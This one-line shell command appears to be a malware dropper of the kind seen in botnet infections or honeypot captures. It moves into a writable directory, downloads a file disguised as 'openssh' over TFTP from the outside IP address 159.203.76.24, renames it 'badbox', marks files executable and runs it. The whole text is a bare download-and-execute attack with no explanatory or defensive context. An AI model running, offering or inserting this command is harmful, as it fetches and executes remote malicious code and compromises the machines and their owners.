cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r openssh -g 159.203.76.24;cat openssh >badbox;chmod +x *;./badbox
